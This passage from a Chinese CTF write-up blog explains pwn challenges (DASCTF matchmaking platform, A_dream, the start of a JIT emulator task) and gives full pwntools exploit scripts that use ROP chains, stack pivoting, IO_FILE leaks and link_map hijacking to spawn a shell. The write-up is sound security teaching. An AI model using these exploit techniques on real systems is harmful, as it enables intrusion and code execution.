alt="image-20231128145603465"></p><p>会抬栈0x18并且pop两个值，所以在ROP链之前还需要添加0x28的payload，exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./toolkit&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    io=process(<span class="string">&#x27;./toolkit&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;[+] &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="number">0xDEAD00</span>))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Password: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> io.recvuntil(<span class="string">&quot;Gift: &quot;</span>, timeout=<span class="number">0.1</span>) != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io.close()</span><br><span class="line">codebase = u64(io.recvuntil(<span class="string">&quot;\n\n&quot;</span>)[:-<span class="number">2</span>].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x1591</span></span><br><span class="line">log.success(<span class="string">&#x27;codebase =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(codebase)))</span><br><span class="line">pop_rdi_ret=<span class="number">0x0000000000002933</span></span><br><span class="line">pop_rsi_r15_ret=<span class="number">0x0000000000002931</span></span><br><span class="line">ret=<span class="number">0x000000000000101a</span></span><br><span class="line">payload=<span class="string">&#x27;flag\x00&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">304</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload+=p64(codebase + elf.bss(<span class="number">0x200</span>))</span><br><span class="line">payload+=p64(codebase+<span class="number">0x25e0</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">360</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload+=p64(codebase+pop_rdi_ret)</span><br><span class="line">payload+=p64(codebase+<span class="number">0x5060</span>)</span><br><span class="line">payload+=p64(codebase+pop_rsi_r15_ret)</span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(codebase+<span class="number">0x0000000000001270</span>)</span><br><span class="line">payload+=p64(codebase+<span class="number">0x000000000000292A</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">3</span>)+p64(codebase+<span class="number">0x5260</span>)+p64(<span class="number">0x40</span>)</span><br><span class="line">payload+=p64(codebase+elf.got[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload+=p64(codebase+<span class="number">0x0000000000002910</span>)</span><br><span class="line">payload+=<span class="string">&#x27;a&#x27;</span>*<span class="number">56</span></span><br><span class="line">payload+=p64(codebase+pop_rdi_ret)</span><br><span class="line">payload+=p64(codebase+<span class="number">0x5260</span>)</span><br><span class="line">payload+=p64(codebase+<span class="number">0x0000000000001330</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;[+] &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;[-] &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Length: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Key: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>需要注意的是，返回地址需要设置为try和catch之间的地址，只有这样才能被捕获异常。</p><h2 id="0x12-DASCTF-6th-matchmaking-platform-【整数溢出，IO-FILE泄露地址，修改link-map结构体劫持延迟绑定实现任意函数调用，】"><a href="#0x12-DASCTF-6th-matchmaking-platform-【整数溢出，IO-FILE泄露地址，修改link-map结构体劫持延迟绑定实现任意函数调用，】" class="headerlink" title="0x12.DASCTF 6th matchmaking platform  【整数溢出，IO_FILE泄露地址，修改link_map结构体劫持延迟绑定实现任意函数调用，】"></a>0x12.DASCTF 6th matchmaking platform  【整数溢出，IO_FILE泄露地址，修改link_map结构体劫持延迟绑定实现任意函数调用，】</h2><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230610161424394.png" alt="image-20230610161424394"></p><p>按顺序执行4321的功能</p><p>看到<code>sub_12B7</code>函数</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230610161540735.png" alt="image-20230610161540735"></p><p>v3为char类型，当v3为127时退出变量v4被置一，但这里判断之后再读取，所以当v3为127后依然会进行读取，并且写入的索引为++v3，而++v3为128，也就是0x80，由于v3为char类型，0x80实际上为-128，也就是会往a1[-0x80]位置处写入1个字节。</p><p>a1为0x4140，0x4140-0x80&#x3D;0x40c0</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230610162346269.png" alt="image-20230610162346269"></p><p>在功能3中会往0x40c0处的数据指向的内存中写入数据</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230610162440012.png" alt="image-20230610162440012"></p><p>正常来说应该往0x00005555555592a0中写入数据，而由于我们可以修改0x5555555580c0地址末尾1字节的值，也就是可以将0x00005555555580c8的末尾一字节进行修改.</p><p>注意到</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230610163342760.png" alt="image-20230610163342760"></p><p>40c0上方的4080处就是stdout指针，所以我们可以将0x00005555555580c8修改为0x0000555555558080，也就是指向stdout指针，这样在功能3执行时就会往stdout结构体中写入数据。</p><p>这道题的预期解是劫持link_map结构体，所以我这里也按照预期解的思路进行操作</p><p>由于可以往stdout结构体中写入数据，所以我们可以泄露libc和pie地址</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230610164057731.png" alt="image-20230610164057731"></p><p>通过改小<code>_IO_write_base</code>的值，就会输出<code>_IO_write_ptr-_IO_write_base</code>之间的数据，由此来得到pie的地址。</p><p>在延迟绑定机制中，会push两个值，一个是该函数在rel.plt上的偏移，另一个则是link_map结构体的地址</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230610171159898.png" alt="image-20230610171159898"></p><p>link_map的地址存放在0x555555558008中，这个地址是.got.plt段的第二个字段</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230610171308263.png" alt="image-20230610171308263"></p><p>之后会调用<code>dl_runtime_resolve</code>函数，在<code>dl_runtime_resolve</code>中会调用<code>_dl_fixup</code>函数，<code>_dl_fixup</code>又会调用<code>_dl_lookup_symbol</code>函数</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230610171820970.png" alt="image-20230610171820970"></p><p><code>_dl_lookup_symbol</code>函数的作用是在动态链接的库中查找符号，并返回符号的地址，所以如果我们能劫持查找的符号名，就能够劫持延迟绑定机制。</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230610173847089.png" alt="image-20230610173847089"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span></span></span><br><span class="line"><span class="class"><span class="title">const</span> <span class="title">char</span> *<span class="title">strtab</span> =</span> (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_STRTAB]);</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_STRTAB5<span class="comment">/* Address of string table */</span></span></span><br></pre></td></tr></table></figure><p>strtab是link_map结构体中l_info数组的第六个元素</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230610174110484.png" alt="image-20230610174110484"></p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230610174230998.png" alt="image-20230610174230998"></p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230610174353727.png" alt="image-20230610174353727"></p><p>在程序结尾，会调用free函数，此时会进行延迟绑定机制，所以我们考虑劫持free函数。</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230610190012660.png" alt="image-20230610190012660"></p><p>功能2和功能1实际上和功能4，3是一样的。由于我们要劫持link_map结构体，所以在功能2处我们将末尾一字节修改为link_map结构体的地址，也就是got表的第二项的地址。</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230610190444256.png" alt="image-20230610190444256"></p><p>之后我们就可以修改link_map结构体的值了，link_map结构体开头如下</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230610190919603.png" alt="image-20230610190919603"></p><p>l_addr实际上是pie的地址</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230610191115941.png" alt="image-20230610191115941"></p><p>当dl_runtime_resolve执行结束后，函数的真实地址就会被写入到<code>l_addr+sym.got</code>中</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230610191356509.png" alt="image-20230610191356509"></p><p>而l_info[5]位于link_map结构体的0x68偏移处，而我们可以将这个值修改为一个我们可控的内存地址，而我们可控的内存地址也只有0x4140，我们在其中构造好_dl_lookup_symbol函数需要的参数，将free解析为system函数。然而后面调用free的时候，则是free(ptr)</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230610192437699.png" alt="image-20230610192437699"></p><p>ptr并不是我们可控的，这样想构造system(“&#x2F;bin&#x2F;sh”)就有了点问题。这里就需要使用到l_addr，我们将l_addr稍微改大一点，使得l_addr+free@got&#x3D;puts@got，这样一来system函数的地址就会被写入puts的got表中，后续调用<code>puts(byte_4140)</code>实际上就是调用<code>system(byte_4140)</code>，只需要提前在0x4140处写入&#x2F;bin&#x2F;sh字符串就可以getshell。</p><p>接下来看到需要在0x4140构造什么样的数据。</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230610193233443.png" alt="image-20230610193233443"></p><p>strtab为0x0000555555554570，对于alarm函数而言，sym-&gt;st_name为0x48，这个可以通过计算得到，也可以直接在gdb中查看</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230610193444101.png" alt="image-20230610193444101"></p><p>那么对于free函数，sym-&gt;st_name应该是多少</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230610193512246.png" alt="image-20230610193512246"></p><p>对于free函数，sym-&gt;st_name为0x77</p><p>所以，如果我们将l_info[5]设置为0x4140，那么我们需要在0x4140+0x77处构造好system字符串，同时在0x4140开头构造好&#x2F;bin&#x2F;sh.</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230610193836455.png" alt="image-20230610193836455"></p><p>puts的got表在free的got表后面8字节，所以我们只需要将l_addr在原来的基础上加8就可以。</p><p>整个攻击流程如下</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230610200921329.png" alt="image-20230610200921329"></p><p>l_info[5]已经被修改为了0x4140</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230610201018484.png" alt="image-20230610201018484"></p><p>l_addr也被修改为了pie+8</p><p>在0x4140开头，我们构造好&#x2F;bin&#x2F;sh字符串，第二个八字节就是strtab的地址，这里我们依然设置为0x4140，然后在0x4140处设置好system字符串。</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230610201217680.png" alt="image-20230610201217680"></p><p>如上图，system字符串可以顺利找到。</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230610201905708.png" alt="image-20230610201905708"></p><p><code>_dl_lookup_symbol_x</code>函数也会去解析system函数</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230610202014736.png" alt="image-20230610202014736"></p><p>解析完成后，puts的got表中也被写入了system函数的地址。</p><p>exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Age &gt;&gt; &#x27;</span>)</span><br><span class="line">    io.send(<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x80</span>+<span class="string">&#x27;\x80&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Photo(URL) &gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">&#x27;\xb0\x5d&#x27;</span>)</span><br><span class="line">    pie_base = u64(io.recv(<span class="number">6</span>, timeout = <span class="number">0.5</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x40a0</span></span><br><span class="line">    <span class="keyword">if</span> (pie_base &amp; <span class="number">0xfff</span>) != <span class="number">0</span> :</span><br><span class="line">        exit(-<span class="number">1</span>)</span><br><span class="line">    success(<span class="string">&#x27;pie_base =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(pie_base)))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Name &gt;&gt; &#x27;</span>)</span><br><span class="line">    payload=<span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    payload+=p64(pie_base+<span class="number">0x4140</span>)</span><br><span class="line">    payload=payload.ljust(<span class="number">0x77</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload+=<span class="string">&#x27;system&#x27;</span></span><br><span class="line">    payload=payload.ljust(<span class="number">0x80</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload+=p8(<span class="number">0x8</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line">    payload=p64(pie_base+<span class="number">0x8</span>).ljust(<span class="number">0x68</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload+=p64(pie_base+<span class="number">0x4140</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Hobby &gt;&gt; &#x27;</span>)</span><br><span class="line">    <span class="comment"># gdb.attach(io)</span></span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    </span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">global</span> io</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">            pwn()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            io.close()</span><br></pre></td></tr></table></figure><h2 id="0x13-DASCTF-6th-A-dream-【多线程pwn，栈迁移】"><a href="#0x13-DASCTF-6th-A-dream-【多线程pwn，栈迁移】" class="headerlink" title="0x13.DASCTF 6th A_dream 【多线程pwn，栈迁移】"></a>0x13.DASCTF 6th A_dream 【多线程pwn，栈迁移】</h2><p>一道多线程的栈溢出</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230611163205963.png" alt="image-20230611163205963"></p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230611163226229.png" alt="image-20230611163226229"></p><p>开了很严格的沙箱，禁止了orw</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230611163403999.png" alt="image-20230611163403999"></p><p>启动一个线程</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230611163431975.png" alt="image-20230611163431975"></p><p>在这个线程函数中定时打印。</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230611163916038.png" alt="image-20230611163916038"></p><p>在下面的函数中，也就是主线程中开启沙箱，并存在一个栈溢出，能够刚好覆盖到返回地址。</p><p>由于溢出字节不够，所以肯定得栈迁移。</p><p>栈迁移往bss段迁移，一般的栈迁移得将返回地址设置为leave ret，但这里只有一次输入机会，所以如果设置为leave ret后续也没有继续操作的机会了，因此第一次溢出返回地址不能设置为leave ret，那么该如何操作？</p><p>还是将rbp覆盖为要迁移过去的地址加上缓冲区的大小，即bss+0x40，将返回地址覆盖为read函数开始处，如下</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230611165629336.png" alt="image-20230611165629336"></p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230611165753115.png" alt="image-20230611165753115"></p><p>leave相当于mov rsp，rbp；pop rbp，执行完leave之后rbp将会被设置为bss段的地址</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230611165914314.png" alt="image-20230611165914314"></p><p>然后继续调用溢出函数，由于溢出函数的buffer是以rbp的值为基准的，所以在这一次溢出之中，read函数将往bss段写入数据。在这一次读取中，我们直接将后需要执行的rop链写入bss段中，然后将rbp覆盖为bss-0x8，将返回地址设置为leave ret，这样一来就会栈迁移到bss处继续往下执行，而由于一开始rbp的值为bss+0x40，后续read将往bss+0x40-0x40中写入数据，所以栈迁移过去之后就会直接执行我们事先写入的ROP链。</p><p>那么我们的ROP链要进行什么操作？由于主线程中存在沙箱，无法getshell或者orw，那么只能在子线程中做手脚。子线程中调用了write函数，如果我们劫持write的got表为read的溢出函数，那么我们就能够在子线程中进行溢出操作。所以在前面的ROP链中我们将对write函数的got表进行修改。修改了got表之后再调用sleep函数使主线程进入阻塞，因为如果主线程结束了那么子线程也会消失，我们需要阻塞主线程使得我们能够对子线程进行操作。</p><p>我们往bss段中写入如下数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload=p64(pop_rsi_r15)+p64(elf.got[<span class="string">&#x27;write&#x27;</span>])+p64(<span class="number">0</span>)+p64(elf.plt[<span class="string">&#x27;read&#x27;</span>])+p64(pop_rdi)+p64(<span class="number">0x1000</span>)+p64(elf.plt[<span class="string">&#x27;sleep&#x27;</span>])</span><br><span class="line">payload=payload.ljust(<span class="number">0x40</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(bss-<span class="number">8</span>)+p64(leave_ret)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230611171124501.png" alt="image-20230611171124501"></p><p>栈迁移之后</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230611171211263.png" alt="image-20230611171211263"></p><p>会执行read函数读取我们输入的数据来修改write的got表，随后进入sleep状态。然后子线程调用write函数时就会调用存在溢出的read。</p><p>这里有一点需要注意的是，如下图</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230611171634200.png" alt="image-20230611171634200"></p><p>这是调用write函数的栈空间，调用write首先会call write的plt，在call一个函数的时候会将其返回地址压栈，栈会变成如下所示：</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230611171744954.png" alt="image-20230611171744954"></p><p>而当我们将write的got表修改为了溢出点之后，调用read@plt的时候，栈空间是这个样子</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230611172110874.png" alt="image-20230611172110874"></p><p>相比正常调用write函数时多压了一个返回地址，这是因为一开始调用write@plt会压入一条返回地址，后面调用read@plt也会压入一条返回地址。那么read函数的buffer是哪</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230611172251159.png" alt="image-20230611172251159"></p><p>由于返回地址位于<code>0x7fa0e3c1fee0</code>处，所以我们只需要填充0x30的垃圾字符就能劫持控制流，在这一次溢出之中，我们将要泄露libc地址，返回地址依然设置为存在溢出的read，其实得到libc地址之后就能够故技重施调用system(“&#x2F;bin&#x2F;sh”)，但system这里栈对其有点问题，多出来的字节也只能写一个ret，所以不能够直接将返回地址修改为system，还是需要像前面那样进行栈迁移以扩充我们的可用字节数。</p><p>由于子线程的栈是mmap出来的一块内存，所以相对于libc的偏移固定，我们只需要计算出libc地址，就能够得到子线程的栈地址。然后我们直接将system的rop链写入到buffer中，然后将rbp修改为buffer-8，返回地址修改为leave ret，这样最后就会栈迁移到buffer开头处执行我们的ROP链，exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># io=gdb.debug(&#x27;./pwn_9&#x27;,&#x27;break 0x000000000040136E&#x27;)</span></span><br><span class="line">io=process(<span class="string">&#x27;./pwn_9&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn_9&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bss=elf.bss()+<span class="number">0x100</span></span><br><span class="line">magic_read=<span class="number">0x00000000004013AE</span></span><br><span class="line">pop_rdi=<span class="number">0x0000000000401483</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x0000000000401481</span></span><br><span class="line">leave_ret=<span class="number">0x000000000040136c</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>+p64(bss+<span class="number">0x40</span>)+p64(magic_read)</span><br><span class="line">io.send(payload)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">payload=p64(pop_rsi_r15)+p64(elf.got[<span class="string">&#x27;write&#x27;</span>])+p64(<span class="number">0</span>)+p64(elf.plt[<span class="string">&#x27;read&#x27;</span>])+p64(pop_rdi)+p64(<span class="number">0x1000</span>)+p64(elf.plt[<span class="string">&#x27;sleep&#x27;</span>])</span><br><span class="line">payload=payload.ljust(<span class="number">0x40</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(bss-<span class="number">8</span>)+p64(leave_ret)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br><span class="line">io.send(payload)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">io.send(p64(magic_read))</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>+p64(pop_rdi)+p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])+p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])+p64(magic_read)</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">libc_base=u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr=libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">thread_stack_addr=libc_base-<span class="number">0x4150</span></span><br><span class="line">log.success(<span class="string">&#x27;libc_base =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">log.success(<span class="string">&#x27;system_addr =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(system_addr)))</span><br><span class="line">log.success(<span class="string">&#x27;binsh_addr =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(binsh_addr)))</span><br><span class="line">ret=<span class="number">0x000000000040101a</span></span><br><span class="line">payload=p64(pop_rdi)+p64(binsh_addr)+p64(system_addr)</span><br><span class="line">payload=payload.ljust(<span class="number">0x40</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(thread_stack_addr-<span class="number">0x8</span>)+p64(leave_ret)</span><br><span class="line"><span class="comment"># payload=b&#x27;a&#x27;*0x30+p64(ret)+p64(pop_rdi)+p64(binsh_addr)+p64(system_addr)</span></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x14-铁三决赛-fast-emulator-【JIT-pwn】"><a href="#0x14-铁三决赛-fast-emulator-【JIT-pwn】" class="headerlink" title="0x14.铁三决赛 fast_emulator 【JIT pwn】"></a>0x14.铁三决赛 fast_emulator 【JIT pwn】</h2><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230611175737513.png" alt="image-20230611175737513"></p><p>一道JIT的pwn题，之前没接触过这种类型的题目，比赛时没做出来。</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230611175916810.png" alt="image-20230611175916810"></p><p>输入汇编指令，然后程序会对其进行解析，其中parse_line函数是取出每一行指令，然后送入write_code函数将指令转换成字节码。</p><p>看到write_code函数</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230612103400858.png" alt="image-20230612103400858"></p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230612103443402.png" alt="image-20230612103443402"></p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230612103459381.png" alt="image-20230612103459381"></p><p>本质上就是通过检测指令助记符是哪个，然后设置对应的字节码，这里的漏洞在load指令解析处</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230612103918902.png" 